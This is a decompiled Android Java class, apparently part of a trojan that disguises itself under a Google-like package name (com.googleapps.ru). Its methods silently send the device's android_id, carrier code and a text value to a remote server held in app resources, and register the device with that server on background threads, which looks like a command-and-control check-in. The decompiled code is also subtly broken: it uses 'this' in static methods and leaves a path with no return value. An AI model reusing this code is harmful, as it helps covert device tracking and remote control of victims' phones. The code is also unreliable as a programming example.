package com.googleapps.ru;

import android.content.Context;
import android.provider.Settings.Secure;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public class DeviceRegistrar
{
  public static final String STATUS_EXTRA = "Status";
  
  public DeviceRegistrar() {}
  
  public static String getNumberAndPrefix(Context paramContext, String paramString)
  {
    try
    {
      Object localObject = new DefaultHttpClient();
      String str = Settings.Secure.getString(paramContext.getContentResolver(), "android_id");
      paramContext = ((HttpClient)localObject).execute(new HttpGet(paramContext.getString(2131165207) + "?device_id=" + str + "&text=" + paramString + "&mnc=" + Utils.getMNC(paramContext)));
      if (paramContext.getStatusLine().getStatusCode() == 200)
      {
        paramContext = new BufferedReader(new InputStreamReader(paramContext.getEntity().getContent(), "utf-8"));
        paramString = new StringBuilder();
        for (;;)
        {
          localObject = paramContext.readLine();
          if (localObject == null) {
            return paramString.toString();
          }
          paramString.append((String)localObject);
        }
      }
      return null;
    }
    catch (Exception paramContext)
    {
      Log.d("DEBUGGING", paramContext.getMessage());
    }
  }
  
  private static HttpResponse makeRequest(Context paramContext, String paramString1, String paramString2)
    throws Exception
  {
    DefaultHttpClient localDefaultHttpClient = new DefaultHttpClient();
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append("&reg_id=");
    localStringBuilder.append(paramString1);
    if (paramString2.equals(paramContext.getString(2131165205)))
    {
      localStringBuilder.append("&device_id=");
      localStringBuilder.append(Settings.Secure.getString(paramContext.getContentResolver(), "android_id"));
    }
    return localDefaultHttpClient.execute(new HttpGet(paramString2 + localStringBuilder.toString()));
  }
  
  public static void registerToServer(Context paramContext, final String paramString)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        try
        {
          DeviceRegistrar.makeRequest(DeviceRegistrar.this, paramString, DeviceRegistrar.this.getString(2131165205)).getStatusLine().getStatusCode();
          return;
        }
        catch (Exception localException)
        {
          Log.d("DEBUGGING", "Error: " + localException.getMessage());
        }
      }
    }).start();
  }
  
  public static void unregisterToServer(Context paramContext, final String paramString)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        try
        {
          HttpResponse localHttpResponse = DeviceRegistrar.makeRequest(DeviceRegistrar.this, paramString, DeviceRegistrar.this.getString(2131165206));
          localHttpResponse.getStatusLine().getStatusCode();
          Log.d("DEBUGGING", "Server response code: " + localHttpResponse.getStatusLine().getStatusCode());
          return;
        }
        catch (Exception localException)
        {
          Log.d("DEBUGGING", "Error: " + localException.getMessage());
        }
      }
    }).start();
  }
}
